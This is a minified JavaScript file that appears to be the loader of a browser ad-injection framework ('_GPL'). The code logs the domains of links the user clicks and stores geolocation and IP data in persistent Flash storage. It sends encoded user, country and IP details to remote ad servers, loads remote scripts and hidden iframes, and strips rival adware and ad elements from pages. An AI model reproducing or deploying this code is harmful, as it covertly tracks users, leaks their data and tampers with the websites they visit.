if(!Array.prototype.indexOf)Array.prototype.indexOf=function(a){if(this===void 0||this===null)throw new TypeError;var d=Object(this),c=d.length>>>0;if(c===0)return-1;var b=0;arguments.length>0&&(b=Number(arguments[1]),b!==b?b=0:b!==0&&b!==1/0&&b!==-(1/0)&&(b=(b>0||-1)*Math.floor(Math.abs(b))));if(b>=c)return-1;for(b=b>=0?b:Math.max(c-Math.abs(b),0);b<c;b++)if(b in d&&d[b]===a)return b;return-1};var _gaq=_gaq||[];if(typeof _GPL=="undefined"){var _GPL={vars:{zoneid:"8623",pid:"1036"},proto:"https:"==document.location.protocol?"https://":"http://",baseCDN:"",fCDN:"d15gt9gwxw5wu0.cloudfront.net",items:{},item_vars:{},item_perms:{"ALL":{"bda27":[],"fb7b3":[],"68d78":[],"59156":[]}},item_delays:{"bda27":{"min":"0","max":"0"},"fb7b3":{"min":"0","max":"0"},"68d78":{"min":"0","max":"0"},"59156":{"min":"0","max":"0"}},f:{},fl:{},rl:false,cloaked:!1,isIE6:navigator.userAgent.toLowerCase().indexOf("msie")!=-1,cb:Math.floor((new Date).getTime()/1E3)-Math.floor((new Date).getTime()/1E3)%3600,loaded_domain_rules:false,i:function(){if(location.protocol!='http:'&&location.protocol!='https:'){return}var a=this.findals();if(a){this.vars.zoneid=this.vars.zoneid.split(',')[0];this.item_perms=this.lpz(this.item_perms,this.vars.zoneid);if(!this.vars.aoi)this.vars.aoi=Math.floor((new Date()).getTime()/1000)-1;this.baseCDN=a.src.split('/')[2];self==top?_GPL.init():_GPL.initFrame()}},findals:function(){var a=this.findScript("",/items\/loaders\/loader_\d+\.js/);return(a&&this.getVars(a.src))?a:false},init:function(){this.rS(this.baseCDN);try{_GPL.f['68d78']();_GPL.f['a20c9']();}catch(e){}try{this.items.e6a00.init(function(){_GPL.items.e6a00.set("location.href",location.href);_GPL.cld();_GPL.lfi();if(!_GPL.vars.cid){_GPL.loadGeo()}else{_GPL.loadCC()}})}catch(e){}if(this.vars.cid){this.loadDomainRules()}else{setTimeout(function(){if(!_GPL.loaded_domain_rules){_GPL.setDefaultGeoAndGo()}},10000)}(function(){try{var b=document;if(typeof _GPL.gcf=='undefined'){_GPL.gcf=true;var f=function(ev){var obj=(window.external)?event.srcElement:ev.target;if(obj.nodeName!='A'){while(obj.nodeName!='A'&&obj.parentNode){obj=obj.parentNode}}if(obj.nodeName=='A'&&obj.href!=null){var href=obj.href;if(href.indexOf('http')!=0){href=location.protocol+'//'+location.hostname}else{href=href.replace(/^https?:\/\//,"").split('/')[0]}if(href){if(typeof _GPL!='undefined'){_GPL.items.e6a00.set('_GPLLC',href+'::'+Math.floor((new Date).getTime()/1000))}}}};if(!b.addEventListener){b.attachEvent("onclick",f)}else{b.addEventListener("click",f,false)}}}catch(e){}})();},loadGeo:function(){this.items.e6a00.get(['geo.cid','geo.rid','geo.ccid','geo.ip','geo.updatetime'],function(res){var cid=res.v['geo.cid'];var rid=res.v['geo.rid'];var ccid=res.v['geo.ccid'];var ip=res.v['geo.ip'];var updatetime=res.v['geo.updatetime'];if(!cid||(cid&&updatetime&&(Math.floor((new Date()).getTime()/1000)-parseInt(updatetime))>=259200)){_GPL.insertJS(((_GPL.proto=='https://')?'https://s.':'http://')+'ads2srv.com/tb/gc.php?json&cb=_GPL.setGeoAndGo','_GPL_geo')}else{_GPL.vars.cid=cid;_GPL.vars.rid=rid;_GPL.vars.ccid=ccid;_GPL.vars.ip=ip;_GPL.loadCC();_GPL.loadDomainRules()}})},setDefaultGeoAndGo:function(){this.vars.cid='UU';this.vars.rid='';this.vars.ccid='';_GPL.f['fb7b3']();this.loadDomainRules()},setGeoAndGo:function(geo){_GPL.ri('_GPL_geo');this.vars.cid=geo.cid;this.vars.rid=geo.rid;this.vars.ccid=geo.ccid;this.vars.ip=geo.ip;this.items.e6a00.set([{n:"geo.updatetime",v:Math.floor((new Date()).getTime()/1000)},{n:"geo.cid",v:geo.cid},{n:"geo.rid",v:geo.rid},{n:"geo.ccid",v:geo.ccid},{n:"geo.ip",v:geo.ip}]);this.loadCC();this.loadDomainRules()},isN:function(a){return(typeof(a)==='number'||typeof(a)==='string')&&a!==''&&!isNaN(a)},initFrame:function(){},cld:function(){this.items.e6a00.get(['_GPLDOMAINS'],function(res){var b=res.v["_GPLDOMAINS"];if(b){var c=b.split("||");b="";for(var i=0,l=c.length;i<l;++i){var d=c[i].split("::");if(d.length==2&&parseInt(d[1])>(Math.round(new Date().getTime()/1000)-5)){b+="||"+d[0]+"::"+d[1]}}}else{b=""}b+="||"+document.domain+"::"+Math.round(new Date().getTime()/1000);_GPL.items.e6a00.set([{n:"_GPLDOMAINS",v:b}])})},loadCC:function(){this.vars&&this.vars.cid&&document.location.protocol=="http:"&&!this.gc("_GPL_it")&&!(this.vars.cid=="MY"||this.vars.cid=="IN"||this.vars.cid=="PH")&&this.insertJS("http://www.textsrv.com/cc.php?c="+escape(this.B64.encode(this.vars.cid+":"+this.vars.rid+":"+this.vars.ccid+":"+location.hostname+":"+this.vars.pid+":"+this.vars.sourceid+":"+this.zoneid('a652c')+":"+this.vars.ip+":"+this.vars.systemid))+'&cb='+(new Date()).getTime(),'_GPL_a652c')},e:function(s){var e="";for(i=0,l=s.length;i<l;i++){e+=s.charCodeAt(i).toString(16)}return e.split("").reverse().join("")},lfi:function(){_GPL.lfi_values={'cf-dns2':{i:'bda27',v:'1'}};var a=[];for(var i in _GPL.lfi_values){a.push(i)}_GPL.items.e6a00.get(a,function(res){var l=[];for(var n in res.v){for(var i in _GPL.item_perms){if(_GPL.lfi_values[n].i in _GPL.item_perms[i]&&res.v[n]==_GPL.lfi_values[n].v){l.push(_GPL.lfi_values[n].i)}}}_GPL.item_vars['fb7b3']=l;_GPL.f['fb7b3']()})},ihi:function(a){var c=document.createElement("iframe");c.type="text/javascript";c.src=a;c.style.display="none";c.style.visibility="hidden";document.body.appendChild(c)},getFW:function(){return document.documentElement?""+document.documentElement.clientWidth+"x"+document.documentElement.clientHeight:"0x0"},getVars:function(a){for(var d=a.slice(a.indexOf("?")+1).split("&"),c=0;c<d.length;c++)a=d[c].split("="),this.vars[a[0]]=(a.length>1)?unescape(a[1].replace("+"," ")):'';return true},replaceVars:function(a){for(var d,c,b,g=/\{([^\}]+)\}/gi,e=a;d=g.exec(a);)if(d[1].indexOf("_GPL")!=-1){c=!1;d[1].indexOf(",")!=-1&&(c=d[1].split(",")[1]);b=eval(d[1].split(",")[0]);if(!b||typeof b=="undefined")if(c)b=c;else continue;for(;e.indexOf("{"+d[1]+"}")!=-1;)e=e.replace("{"+d[1]+"}",b)}return e},mergeKeysMulti:function(a,b){for(var k in b){if(!a[k])a[k]=b[k];else{for(var j in b[k]){if(!a[k][j]){a[k][j]=b[k][j]}else{for(var l=0,m=b[k][j].length;l<m;++l){if(a[k][j].indexOf(b[k][j][l])==-1){a[k][j].push(b[k][j][l])}}}}}}return a},mergeKeys:function(a,b){for(var k in b){if(!a[k])a[k]=b[k]}return a},newKeys:function(a,b){var c=[];var ak=[];for(var k in a){for(var j in a[k]){if(ak.indexOf(j)==-1)ak.push(j)}}for(var k in b){for(var j in b[k]){if(ak.indexOf(j)==-1&&c.indexOf(j)==-1)c.push(j)}}return c},ri:function(a){try{var b=document.getElementById(a);if(b!=null){b.parentNode.removeChild(b)}}catch(e){}},removeScripts:function(a){},rS:function(a){if(!this.isIE6)for(var d;(d=this.findScript(a,""))&&d;)d.parentNode.removeChild(d)},findScript:function(a,d){for(var c=document.getElementsByTagName("script"),b=c.length-1;b>=0;--b)if(c[b].src&&c[b].src.match(a)&&c[b].src.match(d))return c[b];return!1},loadDomainRules:function(){if(location.host!=""){var a=location.host.replace(RegExp(/^www\./i),"");this.insertJS(this.proto+this.fCDN+"/js/"+a+"/r.js",'_GPL_r')}this.loaded_domain_rules=true},insertJS:function(a){var d=document.getElementsByTagName("head"),d=d.length>0?d:document.getElementsByTagName("body");if(d.length>0){var c=document.createElement("script");c.async=!0;c.type="text/javascript";c.src=a;if(arguments.length>=2){c.id=arguments[1]}d[0].appendChild(c)}},firePixel:function(a){(new Image).src=a},canLoad:function(a){if(this.vars.cid&&((this.item_perms.ALL&&this.item_perms.ALL[a])||(this.item_perms[this.vars.cid]&&this.item_perms[this.vars.cid][a])))if(this.vars.aoi&&this.item_delays[a]&&Math.floor((new Date).getTime()/1E3)>parseInt(this.vars.aoi)+parseInt(this.item_delays[a].min)&&(parseInt(this.item_delays[a].max)==0||Math.floor((new Date).getTime()/1E3)<parseInt(this.vars.aoi)+parseInt(this.item_delays[a].max)))return!0;return!1},gc:function(a){if(document.cookie&&document.cookie!="")for(var d=document.cookie.split(";"),c=0;c<d.length;++c){var b=d[c].replace(/^\s+|\s+$/,"");if(b.substring(0,a.length+1)==a+"=")return decodeURIComponent(b.substring(a.length+1))}return null},sc:function(a,d,c){var b=new Date;b.setHours(b.getHours()+parseInt(c));c=location.hostname.replace(/^www\./,"");c[0]!="."&&(c="."+c);document.cookie=a+"="+d+";expires="+b.toUTCString()+";path=/;domain="+c},zoneid:function(i){var z=[];z=this.am(z,(this.item_perms.ALL&&this.item_perms.ALL[i])?this.item_perms.ALL[i]:[]);z=this.am(z,(this.item_perms[this.vars.cid]&&this.item_perms[_GPL.vars.cid][i])?this.item_perms[this.vars.cid][i]:[]);return (z.length>0)?z[Math.floor(Math.random()*(z.length))]:this.vars.zoneid},am:function(a,b){for(var i=0;i<b.length;i++){if(a.indexOf(b[i])==-1)a.push(b[i])}return a},lpz:function(p,z){for(var j in p){for(var k in p[j]){if(p[j][k].indexOf(z)==-1){p[j][k].push(z)}}}return p},B64:{_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",decode:function(a){for(var d="",c,b,g,e,h,f=0,a=a.replace(/[^A-Za-z0-9\+\/\=]/g,"");f<a.length;)c=this._keyStr.indexOf(a.charAt(f++)),b=this._keyStr.indexOf(a.charAt(f++)),e=this._keyStr.indexOf(a.charAt(f++)),h=this._keyStr.indexOf(a.charAt(f++)),c=c<<2|b>>4,b=(b&15)<<4|e>>2,g=(e&3)<<6|h,d+=String.fromCharCode(c),e!=64&&(d+=String.fromCharCode(b)),h!=64&&(d+=String.fromCharCode(g));return d=this._utf8_decode(d)},_utf8_decode:function(a){for(var d="",c=0,b=c1=c2=0;c<a.length;)b=a.charCodeAt(c),b<128?(d+=String.fromCharCode(b),c++):b>191&&b<224?(c2=a.charCodeAt(c+1),d+=String.fromCharCode((b&31)<<6|c2&63),c+=2):(c2=a.charCodeAt(c+1),c3=a.charCodeAt(c+2),d+=String.fromCharCode((b&15)<<12|(c2&63)<<6|c3&63),c+=3);return d},encode:function(a){for(var d="",c,b,g,e,h,f,i=0,a=this._utf8_encode(a);i<a.length;)c=a.charCodeAt(i++),b=a.charCodeAt(i++),g=a.charCodeAt(i++),e=c>>2,c=(c&3)<<4|b>>4,h=(b&15)<<2|g>>6,f=g&63,isNaN(b)?h=f=64:isNaN(g)&&(f=64),d=d+this._keyStr.charAt(e)+this._keyStr.charAt(c)+this._keyStr.charAt(h)+this._keyStr.charAt(f);return d},_utf8_encode:function(a){for(var a=a.replace(/\r\n/g,"\n"),d="",c=0;c<a.length;c++){var b=a.charCodeAt(c);b<128?d+=String.fromCharCode(b):(b>127&&b<2048?d+=String.fromCharCode(b>>6|192):(d+=String.fromCharCode(b>>12|224),d+=String.fromCharCode(b>>6&63|128)),d+=String.fromCharCode(b&63|128))}return d}}};_GPL.f['fb7b3']=function(){return;if(!_GPL.daz){_GPL.daz=[_GPL.vars.zoneid]}else if(_GPL.daz.indexOf(_GPL.vars.zoneid)==-1){_GPL.daz.push(_GPL.vars.zoneid)}else{return}var injection_items=['a652c'];var l=(typeof _GPL.item_vars['fb7b3']!='undefined')?_GPL.item_vars['fb7b3']:[];for(var i in _GPL.item_perms){for(var j in _GPL.item_perms[i]){if(injection_items.indexOf(j)==-1||l.indexOf(j)!=-1){continue}l.push(j)}}_GPL.ihi(_GPL.proto+"d3lvr7yuk4uaui.cloudfront.net/d.html?c="+escape(_GPL.B64.encode(_GPL.vars.cid+":"+_GPL.vars.rid+":"+_GPL.vars.ccid+":"+_GPL.vars.pid+":"+_GPL.vars.zoneid+":"+_GPL.vars.systemid+":"+l.join(","))),'_GPL_fb7b3');setTimeout(function(){_GPL.ri('_GPL_fb7b3')},3000)};_GPL.items['68d78']={i:function(){if(typeof YontooClient!='undefined')YontooClient={};if(typeof yontooAPI!='undefined')yontooAPI={};if(typeof DealPlyConfig!='undefined'){DealPlyConfig.getBaseUrl=function(){return"https://d3lvr7yuk4uaui.cloudfront.net/items/blank.js?"};DealPlyConfig.getCrownUrl=function(){return"https://d3lvr7yuk4uaui.cloudfront.net/items/blank.js?"}}this.rm(this.ri,['dropdowndeals','Y2LeftFixedCurtain','gbdho','bdca','dealply-toast-1','pricegong_offers_iframe','SF_VISUAL_SEARCH','batAdRight','batAdBottom','batAdMiddle_0','batAdMiddleExt1_0','batAdRight2','invisiblehand-iframe','scTopOfPageRefinementLinks','sf_coupon_obj']);this.rm(this.rc,['yontoolayerwidget','dealply-toast','imb-ad']);this.rm(this.ric,[['productbox','g'],['related-searches','related-searches-bing']]);this.rm(this.rtn,['MIVA_AdLink','itxtrst','kLink','FAAdLink','IL_AD','skimwords-link'])},st:function(i,a){a=(((a||"")+"").toLowerCase().match(/<[a-z][a-z0-9]*>/g)||[]).join('');var t=/<\/?([a-z][a-z0-9]*)\b[^>]*>/gi,c=/<!--[\s\S]*?-->|<\?(?:php)?[\s\S]*?\?>/gi;return i.replace(c,'').replace(t,function($0,$1){return a.indexOf('<'+$1.toLowerCase()+'>')>-1?$0:''})},rm:function(f,a){try{for(var i=0;i<a.length;i++)f(a[i])}catch(e){}},rc:function(a){try{var b=document.getElementsByClassName(a);while(b&&b.length>0){b[0].parentNode.removeChild(b[0])}}catch(e){}},ri:function(a){try{var b=document.getElementById(a);if(b!=null){b.parentNode.removeChild(b)}}catch(e){}},ric:function(a){try{var b=document.getElementById(a[0]);if(b!=null&&b.className==a[1]){b.parentNode.removeChild(b)}}catch(e){}},rtn:function(c){try{var a=document.getElementsByClassName(c);while(a&&a.length>0){var txt=document.createTextNode(_GPL.items['68d78'].st(a[0].innerHTML));a[0].parentNode.insertBefore(txt,a[0].nextSibling);a[0].parentNode.removeChild(a[0])}}catch(e){}}};_GPL.f['a20c9']=function(){if(_GPL.canLoad('a20c9')&&!_GPL.fl['a20c9']&&_GPL.proto=='http://'){_GPL.fl['a20c9']=true;_GPL.insertJS('http://cdn1.certified-apps.com/scripts/shared/enable.js?si=27593&tid=chGE['+_GPL.zoneid('a20c9')+']','_GPL_a20c9')}};_GPL.f['68d78']=function(){if(_GPL.canLoad('68d78')&&!_GPL.fl['68d78']){_GPL.fl['68d78']=true;setInterval(function(){if(_GPL.canLoad('68d78')&&typeof _GPL.items['68d78']!='undefined'&&typeof _GPL.items['68d78'].i=='function'){_GPL.items['68d78'].i()}},1500)}};_GPL.items.e6a00={v:1,ready:!1,flashDetected:!1,log:function(){},swf:{},swf_url:"/items/e6a00/storage.swf",namespace:"gpl",store:{},detectFlash:function(){if(navigator.plugins&&navigator.mimeTypes.length){var a=navigator.plugins["Shockwave Flash"];if(a!=null&&navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin!=null)return a.description.replace(/([a-zA-Z]|\s)+/,"").replace(/(\s+r|\s+b[0-9]+)/,".").split(".")[0]>9}else if(window.ActiveXObject){try{a=new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7")}catch(d){try{a=new ActiveXObject("ShockwaveFlash.ShockwaveFlash")}catch(c){return!1}}if(a!=null)return a.GetVariable("$version").split(" ")[1].split(",")[0]>9}return!1},init:function(onready){this.onready=onready;this.flashDetected=this.detectFlash();if(!this.flashDetected)return!1;var a=document.createElement("div");a.style.position="absolute";a.id="_GPL_e6a00_div";var d="logfn=_GPL.items.e6a00.log&amp;onload=_GPL.items.e6a00.onload&amp;onerror=_GPL.items.e6a00.onerror&amp;LSOName="+this.namespace;a.innerHTML='<object height="1" width="1" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" id="_GPL_e6a00_swf" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"><param value="'+_GPL.proto+_GPL.baseCDN+this.swf_url+'" name="movie"><param value="'+d+'" name="FlashVars"><param value="always" name="allowscriptaccess"><embed height="1" align="middle" width="1" pluginspage="http://www.macromedia.com/go/getflashplayer" flashvars="'+d+'" type="application/x-shockwave-flash" allowscriptaccess="always" quality="high" loop="false" play="true" name="_GPL_e6a00_swf" bgcolor="#ffffff" src="'+_GPL.proto+_GPL.baseCDN+this.swf_url+'"></object>';document.body.appendChild(a);this.swf=document._GPL_e6a00_swf||window._GPL_e6a00_swf},set:function(a){var d=(arguments.length>=2)?arguments[1]:'';if(!this.flashDetected)return!1;if(this.ready&&this.swf&&typeof this.swf.set=='function'){var na=[];if(!this.is_array(a)){na.push({n:a,v:d,t:365*24*60*60})}else{na=a}for(var i=0;i<na.length;i++){this.swf.set(na[i].n,na[i].v)}}else{var c=this;setTimeout(function(){c.set(a,d)},100)}},get:function(a){var ir=(this.flashDetected&&this.ready&&typeof this.swf.get=='function');var f=(arguments.length>=2&&typeof arguments[1]=='function')?arguments[1]:false;if(f){if(!this.is_array(a)){a=[a]}var v={};for(var i=0;i<a.length;i++){v[a[i]]=(ir)?this.swf.get(a[i]):null}f({"i":1,"f":"db.get","v":v})}else{return(ir)?this.swf.get(a):null}},is_array:function(i){return typeof(i)=='object'&&(i instanceof Array)},onload:function(){var a=this;setTimeout(function(){a.ready=!0;a.set("__flashBugFix","1");a.onready()},0)},onready:function(){},onerror:function(){}};_GPL.i()}else{_GPL_new_items=_GPL.newKeys(_GPL.item_perms,{"ALL":{"bda27":[],"fb7b3":[],"68d78":[],"59156":[]}});var _GPL_a=_GPL.findals();if(_GPL_a){_GPL.rS(_GPL_a.src.split('/')[2]);}_GPL.item_perms=_GPL.mergeKeysMulti(_GPL.item_perms,_GPL.lpz({"ALL":{"bda27":[],"fb7b3":[],"68d78":[],"59156":[]}},_GPL.vars.zoneid));_GPL.item_delays=_GPL.mergeKeys(_GPL.item_delays,{"bda27":{"min":"0","max":"0"},"fb7b3":{"min":"0","max":"0"},"68d78":{"min":"0","max":"0"},"59156":{"min":"0","max":"0"}});if(_GPL.rl){for(var _GPL_nic=0;_GPL_nic<_GPL_new_items.length;_GPL_nic++){if(_GPL.f[_GPL_new_items[_GPL_nic]]){_GPL.f[_GPL_new_items[_GPL_nic]]()}}}if(typeof _GPL.f['fb7b3']=='function'){_GPL.f['fb7b3']()}}